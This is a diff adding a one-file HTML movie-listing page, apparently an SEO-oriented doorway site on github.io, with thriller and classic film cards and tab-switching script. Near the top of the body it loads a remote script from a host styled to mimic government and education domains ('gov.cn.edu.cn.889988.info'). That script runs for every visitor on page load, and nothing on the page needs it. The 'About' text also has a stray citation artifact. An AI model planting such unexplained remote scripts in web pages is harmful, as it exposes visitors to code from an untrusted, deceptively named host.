@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>神马午夜电影网 - 午夜惊悚/悬疑/都市暗流电影导航</title>
+<meta name="description" content="神马午夜电影网(shenmawuyedianyingwang-h5.github.io)整理午夜场电影片单：惊悚悬疑、都市暗流、经典回响，移动端自适应，免费影视导航。">
+<meta name="keywords" content="神马午夜电影网,午夜电影,惊悚电影,悬疑电影,都市暗流,经典回响">
+<meta name="author" content="神马午夜电影网">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="神马午夜电影网 - 午夜电影导航">
+<meta property="og:description" content="神马午夜电影网整理惊悚、悬疑、都市暗流与经典午夜片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://shenmawuyedianyingwang-h5.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:16px;scroll-behavior:smooth}
+body{
+  font-family:'PingFang SC','Microsoft YaHei',sans-serif;
+  background:#0b0612;color:#e9d9ff;line-height:1.7;overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+
+/* 月相顶栏 */
+.moon-bar{
+  position:sticky;top:0;z-index:999;
+  background:rgba(11,6,18,.92);backdrop-filter:blur(8px);
+  border-bottom:1px solid #2a1740;
+  padding:.6rem .9rem;display:flex;align-items:center;justify-content:space-between;
+}
+.moon-bar .brand{font-size:1.05rem;font-weight:900;letter-spacing:1px}
+.moon-bar .brand b{color:#ff5db1;text-shadow:0 0 8px rgba(255,93,177,.6)}
+.moon-bar .brand i{color:#9b7bff;font-style:normal}
+.moon-tabs{display:flex;gap:.3rem;overflow-x:auto}
+.moon-tabs a{
+  font-size:.74rem;padding:.3rem .6rem;white-space:nowrap;border-radius:20px;
+  color:#b89be0;border:1px solid #2a1740;transition:.25s;
+}
+.moon-tabs a.active,.moon-tabs a:hover{
+  background:linear-gradient(135deg,#ff5db1,#9b7bff);color:#0b0612;font-weight:700;border-color:transparent;
+}
+.moon-phase{font-size:.7rem;color:#7a5ca8;margin-top:.3rem;text-align:right}
+
+.wrap{padding:.9rem;max-width:1080px;margin:0 auto}
+
+/* 面板 */
+.room{display:none;animation:night .4s ease}
+.room.active{display:block}
+@keyframes night{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+
+/* 首页 */
+#home .mid-hero{
+  background:radial-gradient(120% 120% at 80% 0%,#2a1740 0%,#0b0612 60%);
+  border:1px solid #3a2156;border-radius:18px;padding:1.7rem 1.3rem;margin-bottom:1rem;
+}
+#home .mid-hero h1{font-size:1.7rem;color:#ff8fd0;margin-bottom:.4rem}
+#home .mid-hero h1 span{color:#9b7bff}
+#home .mid-hero p{font-size:.86rem;color:#b89be0}
+.now-showing{
+  margin-top:1rem;display:grid;grid-template-columns:repeat(3,1fr);gap:.7rem;
+}
+.ns{
+  background:#150a24;border:1px solid #2a1740;border-radius:12px;padding:.9rem;text-align:center;
+}
+.ns .clock{font-size:1.1rem;color:#ff5db1;font-weight:800}
+.ns h3{font-size:.82rem;color:#e9d9ff;margin:.3rem 0 .15rem}
+.ns p{font-size:.68rem;color:#7a5ca8}
+
+/* 午夜卡片墙 */
+.room h2{
+  font-size:1.25rem;color:#ff8fd0;margin:0 0 1rem;
+  border-left:4px solid #9b7bff;padding-left:.5rem;
+}
+.night-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:.8rem}
+.ncard{
+  background:#150a24;border:1px solid #2a1740;border-radius:14px;overflow:hidden;transition:.25s;
+  position:relative;
+}
+.ncard:hover{transform:translateY(-4px);box-shadow:0 8px 24px rgba(155,123,255,.25)}
+.ncard .poster{
+  height:118px;background:linear-gradient(135deg,#3a2156,#ff5db1);
+  display:flex;align-items:center;justify-content:center;color:#0b0612;font-weight:800;font-size:.8rem;
+}
+.ncard .poster.dark{background:linear-gradient(135deg,#1b0f2e,#6a3cff)}
+.ncard .poster.blood{background:linear-gradient(135deg,#5a0f2e,#ff5db1)}
+.ncard .body{padding:.65rem}
+.ncard .body h3{font-size:.86rem;color:#f3e9ff;margin-bottom:.2rem}
+.ncard .body .typ{font-size:.7rem;color:#9b7bff}
+.ncard .body .rate{position:absolute;top:8px;right:8px;background:#0b0612cc;color:#ffd36e;
+  font-size:.68rem;padding:.15rem .4rem;border-radius:6px}
+
+/* 都市暗流 */
+.flow-list{display:flex;flex-direction:column;gap:.7rem}
+.flow{
+  display:flex;gap:.8rem;background:#150a24;border:1px solid #2a1740;border-radius:12px;padding:.8rem;align-items:center;
+}
+.flow .no{width:38px;height:38px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;
+  background:linear-gradient(135deg,#ff5db1,#9b7bff);color:#0b0612;font-weight:800;font-size:.8rem}
+.flow h3{font-size:.9rem;color:#f3e9ff}
+.flow p{font-size:.74rem;color:#b89be0}
+
+/* 经典回响 */
+.reel{display:flex;gap:.6rem;overflow-x:auto;padding-bottom:.4rem}
+.reel::-webkit-scrollbar{height:6px}
+.reel::-webkit-scrollbar-thumb{background:#3a2156;border-radius:6px}
+.reel .strip{
+  min-width:140px;background:#150a24;border:1px solid #2a1740;border-radius:10px;padding:.8rem;text-align:center;
+}
+.reel .strip .yr{font-size:.7rem;color:#7a5ca8}
+.reel .strip h3{font-size:.84rem;color:#ff8fd0;margin:.2rem 0}
+
+/* 关于 */
+.about-mid{
+  background:radial-gradient(120% 120% at 20% 0%,#2a1740,#0b0612);
+  border:1px solid #ff5db1;border-radius:18px;padding:1.5rem;
+}
+.about-mid h2{color:#ff8fd0;border:0;padding:0;margin-bottom:.8rem}
+.about-mid p{font-size:.85rem;color:#b89be0;margin-bottom:.6rem}
+.about-mid .meta{
+  margin-top:1rem;background:#150a24;border:1px dashed #9b7bff;border-radius:12px;padding:1rem;
+}
+.about-mid .meta h3{color:#9b7bff;margin-bottom:.4rem}
+.about-mid .meta p{font-size:.78rem;color:#7a5ca8}
+
+/* 底部胶片 */
+.film-strip{
+  margin-top:1.6rem;border-top:1px solid #2a1740;padding:.8rem 0;
+  display:flex;gap:.5rem;overflow:hidden;white-space:nowrap;opacity:.7;
+}
+.film-strip span{
+  font-size:.7rem;color:#7a5ca8;background:#150a24;border:1px solid #2a1740;
+  padding:.25rem .6rem;border-radius:4px;
+}
+.foot{text-align:center;padding:1.2rem 1rem;font-size:.72rem;color:#5a3c7a}
+
+@media(max-width:768px){
+  #home .mid-hero h1{font-size:1.4rem}
+  .now-showing{grid-template-columns:1fr}
+  .night-grid{grid-template-columns:repeat(2,1fr)}
+  .moon-bar .brand{font-size:.95rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="moon-bar">
+  <div>
+    <div class="brand">神马<b>午夜</b><i>电影网</i></div>
+    <div class="moon-phase">🌙 今晚场：23:00 - 03:00</div>
+  </div>
+  <nav class="moon-tabs">
+    <a href="#" class="mtab active" data-room="home">午夜首页</a>
+    <a href="#" class="mtab" data-room="thrill">惊悚悬疑</a>
+    <a href="#" class="mtab" data-room="urban">都市暗流</a>
+    <a href="#" class="mtab" data-room="classic">经典回响</a>
+    <a href="#" class="mtab" data-room="about">关于</a>
+  </nav>
+</header>
+
+<main class="wrap">
+
+  <!-- 午夜首页 -->
+  <section id="home" class="room active">
+    <div class="mid-hero">
+      <h1>神马<span>午夜</span>电影网</h1>
+      <p>深夜不睡的人，总需要一部电影陪着。悬疑、惊悚、都市暗流、老片回响，都在这里。</p>
+      <div class="now-showing">
+        <div class="ns"><div class="clock">23:00</div><h3>午夜低语</h3><p>悬疑 / 惊悚</p></div>
+        <div class="ns"><div class="clock">01:00</div><h3>霓虹深渊</h3><p>都市 / 犯罪</p></div>
+        <div class="ns"><div class="clock">03:00</div><h3>老片回放</h3><p>经典 / 黑白</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 惊悚悬疑 -->
+  <section id="thrill" class="room">
+    <h2>🩸 惊悚悬疑 · 午夜场</h2>
+    <div class="night-grid">
+      <div class="ncard"><div class="rate">8.7</div><div class="poster blood">凶宅</div><div class="body"><h3>午夜凶铃·新生</h3><span class="typ">恐怖 / 悬疑 / 2025</span></div></div>
+      <div class="ncard"><div class="rate">8.4</div><div class="poster dark">密室</div><div class="body"><h3>死亡预告</h3><span class="typ">惊悚 / 心理 / 2025</span></div></div>
+      <div class="ncard"><div class="rate">8.9</div><div class="poster">回魂</div><div class="body"><h3>子夜杀机</h3><span class="typ">动作 / 惊悚 / 2025</span></div></div>
+      <div class="ncard"><div class="rate">8.2</div><div class="poster dark">伪纪</div><div class="body"><h3>禁忌录像</h3><span class="typ">伪纪录 / 恐怖 / 2026</span></div></div>
+    </div>
+  </section>
+
+  <!-- 都市暗流 -->
+  <section id="urban" class="room">
+    <h2>🏙 都市暗流 · 深夜人性</h2>
+    <div class="flow-list">
+      <div class="flow"><div class="no">01</div><div><h3>霓虹深渊</h3><p>加班到凌晨的策划总监，在便利店遇见另一个自己。</p></div></div>
+      <div class="flow"><div class="no">02</div><div><h3>末班地铁</h3><p>最后一节车厢里，没人愿意先下车。</p></div></div>
+      <div class="flow"><div class="no">03</div><div><h3>凌晨三点的电话</h3><p>前妻打来，说梦见他死在十年前的那场雨里。</p></div></div>
+      <div class="flow"><div class="no">04</div><div><h3>城中村之夜</h3><p>拆迁通知贴上门，邻居却比亲戚更像一个家。</p></div></div>
+    </div>
+  </section>
+
+  <!-- 经典回响 -->
+  <section id="classic" class="room">
+    <h2>🎞 经典回响 · 老片重映</h2>
+    <div class="reel">
+      <div class="strip"><div class="yr">1998</div><h3>午夜巴黎</h3><p>文艺 / 奇幻</p></div>
+      <div class="strip"><div class="yr">2001</div><h3>穆赫兰道</h3><p>悬疑 / 梦境</p></div>
+      <div class="strip"><div class="yr">2003</div><h3>老男孩</h3><p>复仇 / 伦理</p></div>
+      <div class="strip"><div class="yr">2014</div><h3>消失的爱人</h3><p>婚姻 / 惊悚</p></div>
+      <div class="strip"><div class="yr">2019</div><h3>寄生虫</h3><p>阶层 / 黑色</p></div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about" class="room">
+    <div class="about-mid">
+      <h2>关于 神马午夜电影网</h2>
+      <p>神马午夜电影网是一个“午夜场片单导航站”，专注整理适合深夜观看的惊悚、悬疑、都市暗流与经典电影。</p>
+      <p>页面采用单文件 H5 结构，CSS/JS 全部内联，手机、平板、电脑一套代码自适应；标题、栏目、片单文字直接写在 HTML 里，方便必应等搜索引擎抓取。[16](@ref)</p>
+      <p>本站仅做影视信息展示与分类导航，不提供盗版资源，也不生成 robots.txt / sitemap.xml。</p>
+      <div class="meta">
+        <h3>站点信息</h3>
+        <p>网站名称：神马午夜电影网</p>
+        <p>网址：https://shenmawuyedianyingwang-h5.github.io</p>
+        <p>关键词：神马午夜电影网、午夜电影、惊悚电影、悬疑电影、都市暗流</p>
+      </div>
+    </div>
+  </section>
+
+  <div class="film-strip">
+    <span>🎬 午夜低语</span><span>🩸 凶铃新生</span><span>🏙 霓虹深渊</span><span>🚇 末班地铁</span>
+    <span>📞 三点来电</span><span>🎞 老片回响</span><span>🌙 神马午夜</span><span>🎥 暗夜放映</span>
+  </div>
+
+  <footer class="foot">
+    <p>© 2024 神马午夜电影网 | https://shenmawuyedianyingwang-h5.github.io</p>
+    <p>本网站仅提供影视信息展示与分类导航，所有资源来自互联网，如有侵权请联系删除。</p>
+  </footer>
+</main>
+
+<script>
+document.querySelectorAll('.mtab').forEach(function(t){
+  t.addEventListener('click',function(e){
+    e.preventDefault();
+    var r=this.dataset.room;
+    document.querySelectorAll('.room').forEach(function(x){x.classList.remove('active')});
+    document.getElementById(r).classList.add('active');
+    document.querySelectorAll('.mtab').forEach(function(x){x.classList.remove('active')});
+    this.classList.add('active');
+    window.scrollTo({top:0,behavior:'smooth'});
+  });
+});
+</script>
+</body>
+</html>
